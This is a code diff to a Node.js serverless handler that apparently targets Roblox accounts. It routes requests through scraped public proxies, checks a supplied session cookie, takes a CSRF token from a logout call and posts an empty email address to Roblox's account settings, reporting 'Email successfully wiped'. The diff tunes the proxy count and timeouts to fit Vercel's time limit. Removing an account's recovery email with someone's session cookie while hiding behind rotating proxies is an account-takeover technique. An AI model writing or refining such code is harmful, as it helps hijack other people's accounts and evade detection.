@@ -23,42 +23,38 @@ module.exports = async function handler(req, res) {
     };
 
     try {
-        // Fetch a massive list of proxies
-        const proxyRes = await axios.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all');
+        const proxyRes = await axios.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=2000&country=all&ssl=all&anonymity=all');
         const proxies = proxyRes.data.split('\n').map(p => p.trim()).filter(p => p.length > 0);
 
         if (proxies.length === 0) {
              return res.status(500).json({ success: false, message: 'Could not fetch proxies.' });
         }
 
-        // Try up to 50 proxies
-        for (let i = 0; i < Math.min(proxies.length, 50); i++) {
+        // Try max 4 proxies to stay under Vercel's 10-second limit
+        for (let i = 0; i < Math.min(proxies.length, 4); i++) {
             const agent = new HttpsProxyAgent(`http://${proxies[i]}`);
             
             try {
-                // Test if the proxy works and the cookie is valid
                 const authCheck = await axios.get('https://users.roblox.com/v1/users/authenticated', { 
-                    headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 4000 
+                    headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 1500 
                 });
 
                 if (authCheck.status === 200) {
-                    // Proxy works! Now try to wipe the email.
                     let csrfToken = '';
                     try {
-                        await axios.post('https://auth.roblox.com/v2/logout', {}, { headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 4000 });
+                        await axios.post('https://auth.roblox.com/v2/logout', {}, { headers: baseHeaders, httpsAgent: agent, proxy: false, timeout: 1500 });
                     } catch (err) {
                         if (err.response && err.response.headers['x-csrf-token']) {
                             csrfToken = err.response.headers['x-csrf-token'];
                         } else {
-                            continue; // If no CSRF, try next proxy
+                            continue; 
                         }
                     }
 
-                    // Send the wipe request
                     try {
                         await axios.post('https://accountsettings.roblox.com/v1/email', { emailAddress: "" }, { 
                             headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrfToken }, 
-                            httpsAgent: agent, proxy: false, timeout: 4000 
+                            httpsAgent: agent, proxy: false, timeout: 1500 
                         });
                         
                         return res.status(200).json({ success: true, data: { messages: ["Email successfully wiped."] } });
@@ -66,16 +62,14 @@ module.exports = async function handler(req, res) {
                         if (err.response && err.response.status === 403) {
                             return res.status(200).json({ success: false, data: { messages: ["Blocked: Roblox requires password for this endpoint."] } });
                         }
-                        // If it fails for another reason, loop continues to next proxy
                     }
                 }
             } catch (err) {
-                // Proxy failed, silently continue to the next one
                 continue; 
             }
         }
 
-        res.status(500).json({ success: false, message: 'All 50 proxies failed to connect to Roblox.' });
+        res.status(500).json({ success: false, message: 'All proxies failed or timed out.' });
 
     } catch (error) {
         res.status(500).json({ success: false, message: 'Internal Error', error: error.message });
